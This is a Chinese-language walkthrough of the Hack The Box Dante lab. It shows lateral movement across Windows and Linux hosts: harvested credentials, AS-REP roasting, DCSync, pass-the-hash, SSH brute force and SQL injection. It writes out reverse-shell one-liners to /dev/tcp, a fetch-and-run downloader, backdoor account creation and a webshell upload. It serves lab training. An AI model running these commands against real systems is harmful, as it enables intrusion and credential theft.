-&gt; 10.10.110.3:41827) at 2023-12-25 03:15:33 -0500 Shell Banner: Microsoft Windows [Version 6.3.9600] ----- C:\Windows\system32&gt; 成功获取到 SYSTEM shell。 查看 Users 目录下的用户： 12/25/2023 03:08 AM &lt;DIR&gt; katwamba 01/08/2021 12:26 PM &lt;DIR&gt; MediaAdmin$ 08/22/2013 03:39 PM &lt;DIR&gt; Public 06/10/2020 11:23 AM &lt;DIR&gt; test 07/19/2022 04:33 PM &lt;DIR&gt; xadmin katwamba test xadmin 在 katwamba\Desktop 目录下找到 flag.txt。该目录下还有一个 employee_backup.xlsx 文件，下载回来。 meterpreter &gt; download "C:\Users\katwamba\Desktop\employee_backup.xlsx" /project/HTB/ProLab/Dante 文件中包含了很多用户名密码。 asmith Princess1 smoggat Summer2019 tmodle P45678! ccraven Password1 kploty Teacher65 jbercov 4567Holiday1 whaguey acb123 dcamtan WorldOfWarcraft67 tspadly RopeBlackfieldForwardslash ematlis JuneJuly1TY fglacdon FinalFantasy7 tmentrso 65RedBalloons dharding WestminsterOrange5 smillar MarksAndSparks91 bjohnston Bullingdon1 iahmed Sheffield23 plongbottom PowerfixSaturdayClub777 jcarrot Tanenbaum0001 lgesley SuperStrongCantForget123456789 用户 Comment 信息泄露 net users 查看用户时发现存在一个 mrb3n 用户，进一步查看该用户的信息时，可以在 Comment 中发现密码和 flag。 mrb3n/S3kur1ty2020! C:\Windows\system32&gt;net user mrb3n net user mrb3n User name mrb3n Full Name mrb3n Comment mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped. DANTE{1_jusT_c@nt_st0p_d0ing_th1s} User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 7/31/2020 3:43:25 PM Password expires 1/27/2021 3:43:25 PM Password changeable 7/31/2020 3:43:25 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon Never Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users The command completed successfully. 域内信息收集（有凭证） 有了域用户 mrb3n/S3kur1ty2020! 后，可以使用 bloodhound 收集域内信息。 bloodhound-python 相比 SharpHound 的优势在于不需要在域内机器中落地，但需要注意的是，UDP 请求无法经过 socks 代理，但 –dns-tcp 参数可以将 dns 请求以 TCP 的方式发送，这样就可以避免 bloodhound-python 无法解析到域名。 p -q bloodhound-python --zip -c All -d DANTE.local -u mrb3n -p 'S3kur1ty2020!' -dc DANTE-DC01.DANTE.local -ns 172.16.1.20 --dns-tcp 但目标返回无法认证成功，难道是密码不对的缘故？ INFO: Found AD domain: dante.local INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dante.local:88)] [Errno 111] Connection refused INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580 Traceback (most recent call last): File "/home/kali/.local/bin//bloodhound-python", line 8, in &lt;module&gt; sys.exit(main()) ^^^^^^ File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 338, in main bloodhound.run(collect=collect, File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 79, in run self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum) File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 523, in prefetch_info self.get_objecttype() File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 240, in get_objecttype self.ldap_connect() File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 69, in ldap_connect ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip, ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py", line 119, in getLDAPConnection raise CollectionException('Could not authenticate to LDAP. Check your credentials and LDAP server requirements.') bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements. 添加后门用户 使用 meterpreter 添加后门用户，注意密码要符合密码策略。 meterpreter &gt; run post/windows/manage/enable_rdp username="dummykitty" password="!QAZ2wsx#EDC" [*] Enabling Remote Desktop [*] RDP is already enabled [*] Setting Terminal Services service startup mode [*] Terminal Services service is already set to auto [*] Opening port in local firewall if necessary [*] Setting user account for logon [*] Adding User: dummykitty with Password: !QAZ2wsx#EDC [*] Adding User: dummykitty to local group 'Remote Desktop Users' [*] Hiding user from Windows Login screen [*] Adding User: dummykitty to local group 'Administrators' [*] You can now login with the created user 或者手动在 shell 中执行。 net user dummykitty !QAZ2wsx#EDC /add net localgroup administrators dummykitty /add 如果目标机器没有开启远程桌面服务，修改注册表。 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 添加完后不知道为什么都无法正常登陆。 主机存活性扫描 常规的一些网络发现命令如下，但都没有发现其他网段。 ipconfig /all #Info about interfaces route print #Print available routes arp -a #Know hosts netstat -ano #Opened ports? type C:\WINDOWS\System32\drivers\etc\hosts ipconfig /displaydns | findstr "Record" | findstr "Name Host" 在 DC01 中扫描 172.16.2.0/24 网段，可以发现存活主机 172.16.2.5 C:\Windows\system32&gt;(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply" (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply" Reply from 172.16.2.5: bytes=32 time&lt;1ms TTL=127 Windows: 172.16.2.5 (DANTE-DC02) 端口扫描 172.16.2.5 主机只有 172.16.1.20 可以访问。msf 可以借助 172.16.1.20 中的 session 自动添加路由，然后对 172.16.2.5 进行端口扫描。 在 172.16.1.20 的 session 中执行 autoroute meterpreter &gt; run autoroute -s 172.16.2.0/24 然后使用 auxiliary/scanner/portscan/tcp 进行端口扫描。 msf6 auxiliary(scanner/portscan/tcp) &gt; use auxiliary/scanner/portscan/tcp msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 172.16.2.5 RHOSTS =&gt; 172.16.2.5 msf6 auxiliary(scanner/portscan/tcp) &gt; set THREADS 10 THREADS =&gt; 10 msf6 auxiliary(scanner/portscan/tcp) &gt; run 端口开放情况如下： [+] 172.16.2.5: - 172.16.2.5:53 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:88 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:139 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:135 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:389 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:445 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:464 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:593 - TCP OPEN [+] 172.16.2.5: - 172.16.2.5:636 - TCP OPEN 目标开放了 88 端口，很有可能是另外一台 DC。 搭建代理: chisel/msf 也可以上传 chisel.exe，开启一个新的 socks 代理，reverse 模式下，server 部署在本地，远程可以直接连接到此前运行的服务端。 start /b ch.exe client 10.10.14.5:12345 R:0.0.0.0:1088:socks 使用 fscan 扫描 fscan -h 172.16.2.0/24 -socks5 127.0.0.1:1088 -p "1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,88,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535" -o 172.16.2.5_fscan_result.txt ___ _ / _ \ ___ ___ _ __ __ _ ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__| &lt; \____/ |___/\___|_| \__,_|\___|_|\_\ fscan version: 1.8.2 Socks5Proxy: socks5://127.0.0.1:1088 start infoscan 172.16.2.5:53 open 172.16.2.5:88 open 172.16.2.5:135 open 172.16.2.5:139 open 172.16.2.5:389 open 172.16.2.5:445 open 172.16.2.5:5985 open 172.16.2.5:47001 open [*] alive ports len is: 8 start vulscan [*] NetInfo: [*]172.16.2.5 [-&gt;]DANTE-DC02 [-&gt;]172.16.2.5 [*] WebTitle: http://172.16.2.5:47001 code:404 len:315 title:Not Found [*] WebTitle: http://172.16.2.5:5985 code:404 len:315 title:Not Found 已完成 8/8 [*] 扫描结束,耗时: 8m38.713472155s fscan 扫描出了 172.16.2.5 机器名为 DANTE-DC02，且开放了 5985 端口。 搭建代理也可以直接使用 msf use auxiliary/server/socks_proxy set SRVPORT 1082 run 通过 SMB 匿名枚举用户名 p -q -f ./proxychains_1088.conf crackmapexec smb 172.16.2.5 --users SMB 172.16.2.5 445 DANTE-DC02 [*] Windows 10.0 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False) SMB 172.16.2.5 445 DANTE-DC02 [-] Error enumerating domain users using dc ip 172.16.2.5: NTLM needs domain\username and a password SMB 172.16.2.5 445 DANTE-DC02 [*] Trying with SAMRPC protocol cme 获取到了域名 DANTE.ADMIN 通过 Kerbrute 枚举用户名 通过 socks5 代理 kerbrute 进行扫描。 p -q -f ./proxychains_1088.conf kerbrute userenum -d dante --dc 172.16.2.5 users.txt users.txt 中包含了 DANTE.local 域中的用户名： asmith smoggat tmodle ccraven kploty jbercov whaguey dcamtan tspadly ematlis fglacdon tmentrso dharding smillar bjohnston iahmed plongbottom jcarrot lgesley julian ben balthazar mrb3n 目标环境可能存在一些问题，扫描时经常会出现： [Root cause: Encoding_Error] Encoding_Error: failed to unmarshal KDC's reply: asn1: syntax error: sequence truncated 查看其他 writeup 才知道存在 jbercov@dante 用户。 ASREProast 针对没有启用 Kerberos 预身份验证的用户，可以使用 ASREProast 获取用户的 TGT，此过程不需要具备域账户，只需要与 KDC 建立连接即可进行攻击。 p -f proxychains_1088.conf GetNPUsers.py dante/jbercov -no-pass -dc-ip 172.16.2.5 -outputfile kerberoasting.hashes [proxychains] Strict chain ... 127.0.0.1:1088 ... 172.16.2.5:88 ... OK $krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07 john/hashcat 破解 krb5asrep 得到 hash 之后可以通过 hashcat 或者 john 进行破解。 hashcat -m 18200 --force -a 0 kerberoasting.hashes /webtools/dicts/rockyou.txt 成功爆破出密码：myspace7 $krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07:myspace7 使用 john 进行破解。 john kerberoasting.hashes --wordlist=/webtools/dicts/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status myspace7 ($krb5asrep$23$jbercov@DANTE) 1g 0:00:00:00 DONE (2023-12-29 04:14) 4.000g/s 57344p/s 57344c/s 57344C/s havana..cherry13 Use the "--show" option to display all of the cracked passwords reliably Session completed. jbercov/myspace7 获取到用户名密码之后，目标开启了 5985 端口，因此可以使用 evil-winrm 连接。 p -q -f proxychains_1088.conf evil-winrm -i 172.16.2.5 -u jbercov -p myspace7 -s /webtools/movement/PowerSharpPack/PowerSharpBinaries 在用户 Desktop 目录可以找到 flag.txt 提权: DACL 滥用导致 DCSync 借助 evil-winrm，我们可以直接加载 winPEASE，将执行结果保存在文件中，然后将结果文件下载回来，但 winPEAS 结果中并没有太多有用的信息。 Bypass-4MSI Invoke-winPEAS.ps1 Invoke-winPEAS &gt;&gt; .out 在拥有凭证的情况下，我们可以使用 bloodhound 来获取更多信息。bloodhound-python 可以使用如下的命令，但会出现 DNS 服务器无法解析的问题。 p -q -f proxychains_1082.conf bloodhound-python --zip -c All -d dante -u jbercov -p myspace7 -dc 172.16.2.5 -ns 172.16.2.5 --dns-tcp 执行 PowerSharpPack 中的 Invoke-SharpHound4 会出现报错。 考虑直接上传 SharpHound.exe 然后执行 -c all *Evil-WinRM* PS C:\temp&gt; .\sh.exe -c all 2023-12-29T14:03:24.7826199+00:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-12-29T14:03:24.8920174+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-12-29T14:03:24.9089993+00:00|INFORMATION|Initializing SharpHound at 14:03 on 29/12/2023 2023-12-29T14:03:25.0013614+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for DANTE.ADMIN : DANTE-DC02.DANTE.ADMIN 2023-12-29T14:03:25.0169982+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-12-29T14:03:25.1263707+00:00|INFORMATION|Beginning LDAP search for DANTE.ADMIN 2023-12-29T14:03:25.1419972+00:00|INFORMATION|Producer has finished, closing LDAP channel 2023-12-29T14:03:25.1419972+00:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-12-29T14:03:55.9584256+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM 2023-12-29T14:04:09.6121665+00:00|INFORMATION|Consumers finished, closing output channel 2023-12-29T14:04:09.6433466+00:00|INFORMATION|Output channel closed, waiting for output task to complete Closing writers 2023-12-29T14:04:09.7527055+00:00|INFORMATION|Status: 92 objects finished (+92 2.090909)/s -- Using 42 MB RAM 2023-12-29T14:04:09.7527055+00:00|INFORMATION|Enumeration finished in 00:00:44.6321094 2023-12-29T14:04:09.8151969+00:00|INFORMATION|Saving cache with stats: 51 ID to type mappings. 52 name to SID mappings. 0 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-12-29T14:04:09.8308184+00:00|INFORMATION|SharpHound Enumeration Completed at 14:04 on 29/12/2023! Happy Graphing! 导入结果之后查看 JBERCOV 的信息，可以发现 JBERCOV 用户具备 GetChangesAll 权限，而 GetChangesAll 权限意味着可以利用 DCSync 导出域内的所有 hash。 通常情况下 DCSync 权限仅有管理员、域管理员、企业管理员和域控制器组的成员才具备，但这里 JBERCOV 用户并不是管理员用户，属于 DACL 滥用。 域服务中资源的访问权限通常通过使用访问控制条目 (ACE) 来授予，DACL（Active Directory 自主访问控制列表）是由 ACE（访问控制条目）组成的列表，用于标识允许或拒绝访问对象的用户和组。 DACL 滥用通常可以使用 BloodHound、Powersploit 中的 Get-DomainObjectAcl 来进行枚举。 DACL 滥用的思维导图如下： 接着我们可以使用 secretdump 来导出域控中的 hash p -q -f proxychains_1088.conf secretsdump.py -outputfile 172.16.2.5_DCSync DANTE.ADMIN/jbercov:myspace7@172.16.2.5 结果如下： [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c::: DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c::: DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:698534680cb407112e87a196bccb2e1f::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095 Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd Administrator:des-cbc-md5:8ac752cea84f4a10 krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46 krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36 krbtgt:des-cbc-md5:dcbff8a80b5b343e DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6 DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d DANTE-DC02$:aes256-cts-hmac-sha1-96:ad70e34f55fb662789158a2a9fd111aa2042a651e518e5e83b8592c35d9f3bce DANTE-DC02$:aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078 DANTE-DC02$:des-cbc-md5:b5497fb9eac17f5d [*] Cleaning up... 提权: Hash 传递 有了 Administrator 的 Hash 之后，我们可以使用 Pass the Hash 来获取 Administrator 权限。 p -q -f proxychains_1088.conf psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8' 'DANTE.ADMIN/Administrator@172.16.2.5' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Requesting shares on 172.16.2.5..... [*] Found writable share ADMIN$ [*] Uploading file kvzbKpgP.exe [*] Opening SVCManager on 172.16.2.5..... [*] Creating service fuZm on 172.16.2.5..... [*] Starting service fuZm..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1490] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt; c:\Users\Administrator\Desktop 下有 flag.txt 和 Note.txt，Note.txt 内容如下，提示我们其实可以通过枚举 DC01 的浏览器记录来找到 172.16.2.0/24 网段。 You were supposed to find this subnet via enumerating the browser history files on DC01. 172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01. c:\Users\Administrator\Documents 目录下还有一个 Jenkins.bat 文件。 net user Admin_129834765 SamsungOctober102030 /add 得到了一个用户凭证，可能与 172.16.1.19 中的 jenkins 有关。 除了使用 impacket 中的 psexec.py 外，msf 中也集成了模块利用。 use exploit/windows/smb/psexec set rhosts 172.16.2.5 set proxies socks5:127.0.0.1:1088 set smbuser Administrator set SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8 set lhost 10.10.14.5 set reverseallowproxy true set DisablePayloadHandler true set payload windows/x64/meterpreter/reverse_tcp set LPORT 1235 run 主机存活性扫描 得到域控权限后，可以进一步探测 172.16.2.0/24 网段存活的主机。 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply" Reply from 172.16.2.5: bytes=32 time&lt;1ms TTL=128 Reply from 172.16.2.101: bytes=32 time&lt;1ms TTL=64 172.16.2.0/24 除了域控只有 172.16.2.101 这台主机 Linux: 172.16.2.101 端口扫描 在 172.16.2.5 使用 msf 对 172.16.2.101 进行端口扫描 use auxiliary/scanner/portscan/tcp set RHOSTS 172.16.2.101 set THREADS 10 run 仅开放一个 ssh 服务 [+] 172.16.2.101: - 172.16.2.101:22 - TCP OPEN SSH 爆破 msf 中可以使用 auxiliary/scanner/ssh/ssh_login 模块来爆破 ssh use auxiliary/scanner/ssh/ssh_login set USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt set RHOSTS 172.16.2.101 set VERBOSE true set ThREADS 10 run [*] 172.16.2.101:22 - Starting bruteforce [-] 172.16.2.101:22 - Failed: 'asmith:Princess1' [!] No active DB -- Credential data will not be saved! [-] 172.16.2.101:22 - Failed: 'smoggat:Summer2019' [-] 172.16.2.101:22 - Failed: 'tmodle:P45678!' [-] 172.16.2.101:22 - Failed: 'ccraven:Password1' [-] 172.16.2.101:22 - Failed: 'kploty:Teacher65' [-] 172.16.2.101:22 - Failed: 'jbercov:4567Holiday1' [-] 172.16.2.101:22 - Failed: 'whaguey:acb123' [-] 172.16.2.101:22 - Failed: 'dcamtan:WorldOfWarcraft67' [-] 172.16.2.101:22 - Failed: 'tspadly:RopeBlackfieldForwardslash' [-] 172.16.2.101:22 - Failed: 'ematlis:JuneJuly1TY' [-] 172.16.2.101:22 - Failed: 'fglacdon:FinalFantasy7' [-] 172.16.2.101:22 - Failed: 'tmentrso:65RedBalloons' [-] 172.16.2.101:22 - Failed: 'dharding:WestminsterOrange5' [-] 172.16.2.101:22 - Failed: 'smillar:MarksAndSparks91' [-] 172.16.2.101:22 - Failed: 'bjohnston:Bullingdon1' [-] 172.16.2.101:22 - Failed: 'iahmed:Sheffield23' [-] 172.16.2.101:22 - Failed: 'plongbottom:PowerfixSaturdayClub777' [-] 172.16.2.101:22 - Failed: 'jcarrot:Tanenbaum0001' [-] 172.16.2.101:22 - Failed: 'lgesley:SuperStrongCantForget123456789' [+] 172.16.2.101:22 - Success: 'julian:manchesterunited' 'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX05 5.4.0-39-generic #43-Ubuntu SMP Fri Jun 19 10:28:31 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ' [*] SSH session 5 opened (10.10.14.5-10.10.110.3:57306 -&gt; 172.16.2.101:22) at 2024-01-01 20:49:15 -0500 登陆成功之后 msf 会自动打开一个 ssh session 提权至 root: polkit:CVE-2021-3560 使用 linPEAS 进行提权信息收集 # linPEAS nc -lvnp 9002 | tee linpeas.out #Host wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim 反弹一个 shell 到 pwncat，方便上传下载文件。 /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1 Dante 靶场可能比较老了，基本上 linux 提权都可以用 polkit:CVE-2021-3560 打通，上传 trator 可以直接提权到 root。 提权: SUID 文件溢出漏洞提权 linPEAS 结果文件中关于 SUID 文件的描述存在如下的一个条目，readfile 并不是 linux 原生的二进制文件。 -rwsr-sr-x 1 root julian 17K Jun 30 2020 /usr/sbin/readfile (Unknown SUID binary!) 原思路是利用 readfile 中存在的溢出漏洞提权至 root。 主机存活性探测 再在 172.16.2.101 中使用 ping 探测主机存活时，可以额外扫出来一个 172.16.2.6，此前在 172.16.2.5 中没有扫描出该主机的原因可能在于防火墙策略的限制。 for i in {1..255};do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &amp;);done 172.16.2.5 172.16.2.6 172.16.2.101 反弹 msf meterpreter 为了进一步渗透 172.16.2.6，我们可以反弹一个 msf meterpreter。 wget -q -O- 10.10.14.5:9999/downloader.sh|bash downloader.sh 内容： #!/bin/bash wget -q http://10.10.14.5:9999/test -O .te chmod +x .te nohup ./.te &amp; 在新获取的 meterpreter 中添加路由： run autoroute -s 172.16.2.6 Linux: 172.16.2.6 端口扫描 在 172.16.2.101 使用 msf 对 172.16.2.6 进行端口扫描 use auxiliary/scanner/portscan/tcp set RHOSTS 172.16.2.6 set THREADS 10 run 172.16.2.6 也同样仅开放 22 端口。 使用 julian:manchesterunited 可以成功登陆。 SSH 爆破 同样可以 SSH 爆破，下面的两个凭证均可以正常登陆 plongbottom:PowerfixSaturdayClub777 julian:manchesterunited use auxiliary/scanner/ssh/ssh_login set USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt set RHOSTS 172.16.2.6 set VERBOSE true set ThREADS 10 run [+] 172.16.2.6:22 - Success: 'plongbottom:PowerfixSaturdayClub777' 'uid=1000(plongbottom) gid=1000(plongbottom) groups=1000(plongbottom),27(sudo) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ' [*] SSH session 7 opened (10.10.14.5-10.10.110.3:42542 -&gt; 172.16.2.6:22) at 2024-01-01 21:43:33 -0500 [-] 172.16.2.6:22 - Failed: 'jcarrot:Tanenbaum0001' [-] 172.16.2.6:22 - Failed: 'lgesley:SuperStrongCantForget123456789' [+] 172.16.2.6:22 - Success: 'julian:manchesterunited' 'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ' [*] SSH session 8 opened (10.10.14.5-10.10.110.3:46782 -&gt; 172.16.2.6:22) at 2024-01-01 21:43:56 -0500 msf 会自动反弹 shell，但这个 shell 不是很稳定，反弹到 pwncat 时出现 time out，可能是有防火墙 /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1 -bash: connect: Connection timed out -bash: line 5: /dev/tcp/10.10.14.5/9896: Connection timed out 可以考虑直接在 172.16.2.101 中使用 ssh 登陆 172.16.2.6 ssh plongbottom@172.16.2.6 获取 SQL 凭证 julian 的 home 目录可以找到一个 flag 和一个 SQL 文件： root@DANTE-ADMIN-NIX06:/home/julian/Desktop# cat SQL Hi Julian I've put this on your personal desktop as its probably the most secure place on the network! Can you please ask Sophie to change her SQL password when she logs in again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but obviously this is a tough one to remember Maybe we should all get password managers? Thanks, James 可以获取到一个 sql 凭证： Sophie/TerrorInflictPurpleDirt996655 提权: sudoers plongbottom 用户属于 sudoers，因此可以直接 su 提权。 注意 msf 获取的反向 shell 无法使用 tty，sudo 会报错。 sudo su sudo: no tty present and no askpass program specified Windows: 172.16.1.13 开放端口： 172.16.1.13 80 172.16.1.13 443 172.16.1.13 445 80 端口 RCE 80 端口部署了一个 XAMPP。/phpinfo.php 可以访问 phpinfo。/phpmyadmin 只能通过本机 IP 进行登陆。 爆破 web 目录可以得到： /cgi-bin/printenv.pl 可以输出一些环境信息。 /discuss 可以进入一个 Dante Technical Discussion Forum 页面。 页面提供了注册功能，可以注册一个用户，登陆之后可以修改用户信息，修改界面存在 sql 注入。 # country 返回 1 un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1# # country 返回 0 un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1# 并且如果对 /discuss/ 目录进行扫描，可以发现 /discuss/db/，可直接下载数据库文件 tech_forum.sql。 最后发现存在历史漏洞： Online Discussion Forum Site 1.0 - Remote Code Execution - PHP webapps Exploit 注册的时候可以上传一个 webshell。上传成功后进行登陆，然后可以在 /ups/ 目录下访问。 简单的 eval webshell 会被杀，但杀软并不强，godzilla PHP_XOR_BASE64 可以正常上传。 